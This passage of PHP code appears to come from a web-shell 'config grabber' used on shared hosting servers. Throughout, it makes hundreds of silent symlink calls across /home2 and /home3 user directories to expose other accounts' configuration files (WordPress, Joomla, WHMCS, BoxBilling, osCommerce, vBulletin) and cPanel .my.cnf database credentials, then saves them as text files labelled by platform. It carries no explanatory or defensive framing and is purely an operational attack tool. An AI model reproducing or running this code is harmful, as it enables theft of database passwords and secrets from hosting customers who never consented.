@symlink('/home2/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home2/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home2/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
//Home3

@symlink('/home3/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home3/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home3/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
